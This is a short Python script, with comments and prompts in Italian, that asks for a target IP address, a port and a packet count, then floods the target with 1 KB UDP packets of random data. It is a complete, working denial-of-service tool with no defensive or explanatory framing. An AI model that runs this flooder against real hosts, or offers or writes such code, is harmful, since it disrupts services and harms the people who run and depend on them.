import socket
import random

# Richiedi all'utente l'IP target
target_ip = input("Inserisci l'IP target: ")

# Richiedi all'utente la porta target
target_port = int(input("Inserisci la porta target: "))

# Richiedi all'utente il numero di pacchetti da inviare
num_packets = int(input("Inserisci il numero di pacchetti da 1 KB da inviare: "))

# Creare un socket UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generare un pacchetto di 1 KB (1024 byte) di dati casuali
packet = random._urandom(1024)

print(f"Inviando {num_packets} pacchetti UDP da 1 KB a {target_ip}:{target_port}")

# Inviare il numero specificato di pacchetti
for _ in range(num_packets):
    sock.sendto(packet, (target_ip, target_port))

print("Invio pacchetti completato")

# Chiudere il socket
sock.close()



    
    
  
